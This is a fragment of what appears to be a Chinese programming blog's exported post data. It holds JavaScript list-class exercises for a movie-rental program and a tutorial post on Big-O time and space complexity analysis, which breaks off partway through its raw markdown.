List();</span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> name = <span class=\"string\">\"jovy_\"</span> + i;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> sex = [<span class=\"string\">\"female\"</span>, <span class=\"string\">\"male\"</span>][<span class=\"built_in\">Math</span>.round(<span class=\"built_in\">Math</span>.random())];</span><br><span class=\"line\">  <span class=\"keyword\">const</span> person = <span class=\"keyword\">new</span> Person(name, sex);</span><br><span class=\"line\">  personList.append(person);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">displayList</span>(<span class=\"params\">list, sex</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">\"All: \"</span> + list.dataStore);</span><br><span class=\"line\">  <span class=\"keyword\">let</span> newList = list.dataStore.filter(<span class=\"function\"><span class=\"params\">element</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> element.sex === sex;</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">\"Filter: \"</span> + newList);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">displayList(personList, <span class=\"string\">\"male\"</span>);</span><br></pre></td></tr></table></figure>\n<h2 id=\"练习四\"><a href=\"#练习四\" class=\"headerlink\" title=\"练习四\"></a>练习四</h2><p>修改本章的影碟租赁程序，当一部影片检出后，将其加入一个已租影片列表。每当有客户检出一部影片，都显示该列表中的内容。（代码见练习五）</p>\n<h2 id=\"练习五\"><a href=\"#练习五\" class=\"headerlink\" title=\"练习五\"></a>练习五</h2><p>为影碟租赁程序创建一个 check-in()函数，当客户归还一部影片时，将该影片从已租列表中删除，同时添加到现有影片列表中。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 练习四和练习五</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">List</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.listSize = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.dataStore = []; <span class=\"comment\">//初始化一个空数组来保存列表元素</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  append(element) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.dataStore[<span class=\"keyword\">this</span>.listSize++] = element;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  find(element) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"keyword\">this</span>.dataStore.length; i++) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.dataStore[i] === element) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> i;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  remove(element) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> foundAt = <span class=\"keyword\">this</span>.find(element);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (foundAt &gt; <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.dataStore.splice(foundAt, <span class=\"number\">1</span>);</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.listSize--;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  lenth() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.listSize;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  toString() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.dataStore;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  insert(element, after) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> insertPos = <span class=\"keyword\">this</span>.find(after);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (insertPos &gt; <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.dataStore.splice(insertPos, <span class=\"number\">0</span>, element);</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.listSize++;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  clear() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">delete</span> <span class=\"keyword\">this</span>.dataStore;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.dataStore.length = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.listSize = <span class=\"keyword\">this</span>.pos = <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  contains(element) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"keyword\">this</span>.dataStore.length; i++) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.dataStore[i] === element) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  front() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos = <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  end() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos = <span class=\"keyword\">this</span>.listSize - <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  prev() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos--;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  next() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos++;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  currPos() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.pos;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  moveTo(position) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos = position;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  getElement() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.dataStore[<span class=\"keyword\">this</span>.pos];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  hasNext() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.pos &lt; <span class=\"keyword\">this</span>.listSize;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  hasPrev() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.pos &gt;= <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 定义客户类</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Customer</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>(name, movie) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.name = name;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.movie = movie;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  toString() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.name + <span class=\"string\">\"@\"</span> + <span class=\"keyword\">this</span>.movie;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 显示清单</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">displayList</span>(<span class=\"params\">list</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (list.front(); list.hasNext(); list.next()) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (list.getElement() <span class=\"keyword\">instanceof</span> Customer) &#123;</span><br><span class=\"line\">      <span class=\"built_in\">console</span>.log(</span><br><span class=\"line\">        list.getElement()[<span class=\"string\">\"name\"</span>] + <span class=\"string\">\", \"</span> + list.getElement()[<span class=\"string\">\"movie\"</span>]</span><br><span class=\"line\">      );</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"built_in\">console</span>.log(list.getElement());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 检出电影</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">checkOut</span>(<span class=\"params\">name, movie, movieList, customerList, checkOutMovieList</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (movieList.contains(movie)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> c = <span class=\"keyword\">new</span> Customer(name, movie);</span><br><span class=\"line\">    customerList.append(c);</span><br><span class=\"line\">    movieList.remove(movie);</span><br><span class=\"line\">    <span class=\"comment\">// 练习4</span></span><br><span class=\"line\">    checkOutMovieList.append(movie);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"\\nCheckOutMovieList: \\n\"</span>);</span><br><span class=\"line\">    displayList(checkOutMovieList);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(movie + <span class=\"string\">\" is not available.\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 练习5</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">checkIn</span>(<span class=\"params\">name, movie, movieList, customerList, checkOutMovieList</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> c = customerList.dataStore.find(<span class=\"function\"><span class=\"params\">element</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> element.name === name &amp;&amp; element.movie === movie;</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">  customerList.remove(c);</span><br><span class=\"line\">  movieList.append(movie);</span><br><span class=\"line\">  checkOutMovieList.remove(movie);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 测试+++++++++++++++++++++++++++++++</span></span><br><span class=\"line\"><span class=\"comment\">// 模拟读取数据</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> moviesStr =</span><br><span class=\"line\">  <span class=\"string\">\"肖申克的救赎，教父，教父2，低俗小说，黄金三镖客，十二怒汉，辛德勒名单，黑暗骑士，指环王：王者归来，搏击俱乐部，星球大战5：帝国反击战，飞越疯人院，指环王：护戒使者，盗梦空间，好家伙，星球大战，七武士，黑客帝国，阿甘正传，上帝之城\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">let</span> movies = moviesStr.split(<span class=\"string\">\"，\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 使用列表管理电影数据</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> movieList = <span class=\"keyword\">new</span> List();</span><br><span class=\"line\">movies.forEach(<span class=\"function\"><span class=\"params\">element</span> =&gt;</span> &#123;</span><br><span class=\"line\">  movieList.append(element);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"><span class=\"comment\">// 使用列表管理客户数据</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> customerList = <span class=\"keyword\">new</span> List();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> checkOutMovieList = <span class=\"keyword\">new</span> List();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"Available movies: \\n\"</span>);</span><br><span class=\"line\">displayList(movieList);</span><br><span class=\"line\">checkOut(<span class=\"string\">\"Jovysun\"</span>, <span class=\"string\">\"教父\"</span>, movieList, customerList, checkOutMovieList);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"\\nCustomer Rentals: \\n\"</span>);</span><br><span class=\"line\">displayList(customerList);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"\\nMovies Now Available\\n\"</span>);</span><br><span class=\"line\">displayList(movieList);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"after check-in+++++++++++++++++++++++++++++++++++++++\"</span>);</span><br><span class=\"line\">checkIn(<span class=\"string\">\"Jovysun\"</span>, <span class=\"string\">\"教父\"</span>, movieList, customerList, checkOutMovieList);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"\\nCustomer Rentals: \\n\"</span>);</span><br><span class=\"line\">displayList(customerList);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"\\nMovies Now Available\\n\"</span>);</span><br><span class=\"line\">displayList(movieList);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"\\nCheckOutMovieList: \\n\"</span>);</span><br><span class=\"line\">displayList(checkOutMovieList);</span><br></pre></td></tr></table></figure>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>《数据结构与算法 JavaScript 描述》</p>"},{"title":"数据结构与算法@复杂度分析","date":"2019-05-18T15:17:45.000Z","updated":"2019-05-18T15:17:45.000Z","_content":"\n# 概述\n\n复杂度分析是学习算法的非常重要的部分，主要分为时间复杂度分析和空间复杂度分析。掌握大“O”表示法及几种常见时间复杂度实例分析。知道最好情况时间复杂度、最坏情况时间复杂度、平均情况时间复杂度和均摊时间复杂度。\n\n<!-- more -->\n\n# 详述\n\n## 大 O 时间复杂度表示法\n\n```js\nfunction cal(n) {\n  var sum = 0;\n  var i = 1;\n  var j = 1;\n  for (; i <= n; ++i) {\n    j = 1;\n    for (; j <= n; ++j) {\n      sum = sum + i * j;\n    }\n  }\n}\n```\n\n假如每个语句的执行时间是 unit_time，那么这段代码的总执行时间 T(n)是多少呢？\n\n<p>第 2、3、4 行代码，每行都需要 1 个 unit_time 的执行时间，第 5、6 行代码循环执行了 n 遍，需要 2n * unit_time 的执行时间，第 7、8 行代码循环执行了 n<sup>2</sup>遍，所以需要 2n<sup>2</sup> * unit_time 的执行时间。所以，整段代码总的执行时间 T(n) = (2n<sup>2</sup>+2n+3)*unit_time。</p>\n\n<p>尽管我们不知道 unit_time 的具体值，但是通过这两段代码执行时间的推导过程，我们可以得到一个非常重要的规律，那就是，<strong>所有代码的执行时间 T(n) 与每行代码的执行次数 n 成正比</strong>。</p>\n\n总结成一个公式如下：\n![](o.png)\n\n<p>所以，第一个例子中的 T(n) = O(2n+2)，第二个例子中的 T(n) = O(2n<sup>2</sup>+2n+3)。这就是<strong>大 O 时间复杂度表示法</strong>。大 O 时间复杂度实际上并不具体表示代码真正的执行时间，而是表示<strong>代码执行时间随数据规模增长的变化趋势</strong>，所以，也叫作<strong>渐进时间复杂度</strong>（asymptotic time complexity），简称<strong>时间复杂度</strong>。</p>\n\n<p>当 n 很大时，你可以把它想象成 10000、100000。而公式中的低阶、常量、系数三部分并不左右增长趋势，所以都可以忽略。我们只需要记录一个最大量级就可以了，如果用大 O 表示法表示刚讲的那两段代码的时间复杂度，就可以记为：T(n) = O(n)； T(n) = O(n<sup>2</sup>)。</p>\n\n## 时间复杂度分析\n\n1. 只关注循环执行次数最多的一段代码\n\n```js\nfunction cal(n) {\n  var sum = 0;\n  var i = 1;\n  for (; i <= n; ++i) {\n    sum = sum + 1;\n  }\n  return sum;\n}\n```\n\n以上代码总的时间复杂度就是 O(n)。\n\n2. 加法法则：总复杂度等于量级最大的那段代码的复杂度\n\n```js\nfunction cal(n) {\n  var sum_1 = 0;\n  var p = 1;\n  for (; p < 100; ++p) {\n    sum_1 = sum_1 + p;\n  }\n\n  var sum_2 = 0;\n  var q = 1;\n  for (; q < n; ++q) {\n    sum_2 = sum_2 + q;\n  }\n\n  var sum_3 = 0;\n  var i = 1;\n  var j = 1;\n  for (; i <= n; ++i) {\n    j = 1;\n    for (; j <= n; ++j) {\n      sum_3 = sum_3 + i * j;\n    }\n  }\n\n  return sum_1 + sum_2 + sum_3;\n}\n```\n\n<p>综合这三段代码的时间复杂度，我们取其中最大的量级。所以，整段代码的时间复杂度就为 O(n<sup>2</sup>)。也就是说：<strong>总的时间复杂度<strong><strong>就</strong></strong>等于量级最大的那段代码的时间复杂度</strong>。那我们将这个规律抽象成公式就是：</p>\n\n3. 乘法法则：嵌套代码的复杂度等于嵌套内外代码复杂度的乘积\n\n```js\nfunction cal(n) {\n  var ret = 0;\n  var i = 1;\n  for (; i < n; ++i) {\n    ret = ret + f(i);\n  }\n}\n\nfunction f(n) {\n  var sum = 0;\n  var i = 1;\n  for (; i < n; ++i) {\n    sum = sum + i;\n  }\n  return sum;\n}\n```\n\n<p>我们单独看 cal() 函数。假设 f() 只是一个普通的操作，那第 4～6 行的时间复杂度就是，T1(n) = O(n)。但 f() 函数本身不是一个简单的操作，它的时间复杂度是 T2(n) = O(n)，所以，整个 cal() 函数的时间复杂度就是，T(n) = T1(n) * T2(n) = O(n*n) = O(n<sup>2</sup>)。</p>\n\n## 几种常见时间复杂度实例分析\n\n![](normal.jpg)\n\n1. O(1)\n   O(1) 只是常量级时间复杂度的一种表示方法，并不是指只执行了一行代码。\n\n```js\nvar i = 8;\nvar j = 6;\nvar sum = i + j;\n```\n\n<p>总结一下，只要代码的执行时间不随 n 的增大而增长，这样代码的时间复杂度我们都记作 O(1)。或者说，<strong>一般<strong><strong>情况下</strong></strong>，只要算法中不存在循环语句、递归语句，即使有成千上万行的代码，其时间复杂度也是Ο(1)</strong>。</p>\n\n2. O(logn)、O(nlogn)\n   对数阶时间复杂度非常常见，同时也是最难分析的一种时间复杂度。如下代码：\n\n```js\nvar i = 1;\nwhile (i <= n) {\n  i = i * 2;\n}\n```\n\n一个个列出来，就是这个样子：\n![](log.jpg)\n\n<p>所以，我们只要知道 x 值是多少，就知道这行代码执行的次数了。通过 2<sup>x</sup>=n 求解 x 这个问题我们想高中应该就学过了，我就不多说了。x=log<sub>2</sub>n，所以，这段代码的时间复杂度就是 O(log<sub>2</sub>n)。</p>\n\n现在稍微改下：\n\n```js\nvar i = 1;\nwhile (i <= n) {\n  i = i * 3;\n}\n```\n\n这段代码的时间复杂度为 O(log<sub>3</sub>n)。\n\n<p>实际上，不管是以 2 为底、以 3 为底，还是以 10 为底，我们可以把所有对数阶的时间复杂度都记为 O(logn)。为什么呢？</p>\n\n<p>我们知道，对数之间是可以互相转换的，log<sub>3</sub>n 就等于 log<sub>3</sub>2 * log<sub>2</sub>n，所以 O(log<sub>3</sub>n) = O(C *  log<sub>2</sub>n)，其中 C=log<sub>3</sub>2 是一个常量。基于我们前面的一个理论：<strong>在采用大 O 标记复杂度的时候，可以忽略系数，即 O(Cf(n)) = O(f(n))</strong>。所以，O(log<sub>2</sub>n) 就等于 O(log<sub>3</sub>n)。因此，在对数阶时间复杂度的表示方法里，我们忽略对数的“底”，统一表示为 O(logn)。</p>\n\n<p>如果你理解了我前面讲的 O(logn)，那 O(nlogn) 就很容易理解了。还记得我们刚讲的乘法法则吗？如果一段代码的时间复杂度是 O(logn)，我们循环执行 n 遍，时间复杂度就是 O(nlogn) 了。而且，O(nlogn) 也是一种非常常见的算法时间复杂度。比如，归并排序、快速排序的时间复杂度都是 O(nlogn)。</p>\n\n3. O(m+n)、O(m\\*n)\n\n```js\nfunction cal(m, n) {\n  var sum_1 = 0;\n  var i = 1;\n  for (; i < m; ++i) {\n    sum_1 = sum_1 + i;\n  }\n\n  var sum_2 = 0;\n  var j = 1;\n  for (; j < n; ++j) {\n    sum_2 = sum_2 + j;\n  }\n\n  return sum_1 + sum_2;\n}\n```\n\n<p>从代码中可以看出，m 和 n 是表示两个数据规模。我们无法事先评估 m 和 n 谁的量级大，所以我们在表示复杂度的时候，就不能简单地利用加法法则，省略掉其中一个。所以，上面代码的时间复杂度就是 O(m+n)。</p>\n\n<p>针对这种情况，原来的加法法则就不正确了，我们需要将加法规则改为：T1(m) + T2(n) = O(f(m) + g(n))。但是乘法法则继续有效：T1(m)*T2(n) = O(f(m) * f(n))。</p>\n\n## 空间复杂度分析\n\n<p>前面我讲过，时间复杂度的全称是<strong>渐进时间复杂度</strong>，<strong>表示算法的执行时间与数据规模之间的增长关系</strong>。类比一下，空间复杂度全称就是<strong>渐进空间复杂度</strong>（asymptotic space complexity），<strong>表示算法的存储空间与数据规模之间的增长关系</strong>。</p>\n\n```js\nvoid print(int n) {\n  int i = 0;\n  int[] a = new int[n];\n  for (i; i <n; ++i) {\n    a[i] = i * i;\n  }\n\n  for (i = n-1; i >= 0; --i) {\n    print out a[i]\n  }\n}\n\n```\n\n<p>跟时间复杂度分析一样，我们可以看到，第 2 行代码中，我们申请了一个空间存储变量 i，但是它是常量阶的，跟数据规模 n 没有关系，所以我们可以忽略。第 3 行申请了一个大小为 n 的 int 类型数组，除此之外，剩下的代码都没有占用更多的空间，所以整段代码的空间复杂度就是 O(n)。</p>\n\n<p>我们常见的空间复杂度就是 O(1)、O(n)、O(n<sup>2</sup> )，像 O(logn)、O(nlogn) 这样的对数阶复杂度平时都用不到。而且，空间复杂度分析比时间复杂度分析要简单很多。所以，对于空间复杂度，掌握刚我说的这些内容已经足够了。</p>\n\n## 内容小结\n\n<p>复杂度也叫渐进复杂度，包括时间复杂度和空间复杂度，用来分析算法执行效率与数据规模之间的增长关系，可以粗略地表示，越高阶复杂度的算法，执行效率越低。常见的复杂度并不多，从低阶到高阶有：O(1)、O(logn)、O(n)、O(nlogn)、O(n<sup>2</sup> )。<strong>复杂度分析并不难，关键在于多练。</strong></p>\n\n另外还有四个时间复杂度知识可以进一步学习下：最好情况时间复杂度、最坏情况时间复杂度、平均情况时间复杂度、均摊时间复杂度。\n\n# 参考\n\n极客时间——数据结构与算法之美\n","source":"_posts/2019/05/数据结构与算法-复杂度分析.md","raw":"---\ntitle: 数据结构与算法@复杂度分析\npermalink: 数据结构与算法@复杂度分析\ntags:\n  - JavaScript\ncategories:\n  - 基础\n  - 数据结构与算法\ndate: 2019-05-18 23:17:45\nupdated: 2019-05-18 23:17:45\n---\n\n# 概述\n\n复杂度分析是学习算法的非常重要的部分，主要分为时间复杂度分析和空间复杂度分析。掌握大“O”表示法及几种常见时间复杂度实例分析。知道最好情况时间复杂度、最坏情况时间复杂度、平均情况时间复杂度和均摊时间复杂度。\n\n<!-- more -->\n\n# 详述\n\n## 大 O 时间复杂度表示法\n\n```js\nfunction cal(n) {\n  var sum = 0;\n  var i = 1;\n  var j = 1;\n  for (; i <= n; ++i) {\n    j = 1;\n    for (; j <= n; ++j) {\n      sum = sum + i * j;\n    }\n  }\n}\n```\n\n假如每个语句的执行时间是 unit_time，那么这段代码的总执行时间 T(n)是多少呢？\n\n<p>第 2、3、4 行代码，每行都需要 1 个 unit_time 的执行时间，第 5、6 行代码循环执行了 n 遍，需要 2n * unit_time 的执行时间，第 7、8 行代码循环执行了 n<sup>2</sup>遍，所以需要 2n<sup>2</sup> * unit_time 的执行时间。所以，整段代码总的执行时间 T(n) = (2n<sup>2</sup>+2n+3)*unit_time。</p>\n\n<p>尽管我们不知道 unit_time 的具体值，但是通过这两段代码执行时间的推导过程，我们可以得到一个非常重要的规律，那就是，<strong>所有代码的执行时间 T(n) 与每行代码的执行次数 n 成正比</strong>。</p>\n\n总结成一个公式如下：\n![](o.png)\n\n<p>所以，第一个例子中的 T(n) = O(2n+2)，第二个例子中的 T(n) = O(2n<sup>2</sup>+2n+3)。这就是<strong>大 O 时间复杂度表示法</strong>。大 O 时间复杂度实际上并不具体表示代码真正的执行时间，而是表示<strong>代码执行时间随数据规模增长的变化趋势</strong>，所以，也叫作<strong>渐进时间复杂度</strong>（asymptotic time 